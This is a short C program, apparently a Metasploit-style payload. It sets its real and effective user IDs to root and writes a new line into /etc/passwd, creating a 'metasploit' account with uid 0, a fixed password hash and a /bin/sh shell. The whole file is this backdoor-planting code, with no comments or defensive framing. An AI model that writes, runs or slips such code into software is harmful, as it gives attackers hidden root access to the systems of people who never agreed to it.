#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>


int main() {
  int fd;
  
  setreuid (0, 0);

  fd = open ("/etc//passwd", O_WRONLY | O_NOCTTY);
  write (fd, "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n", 40);

  exit (fd);
}
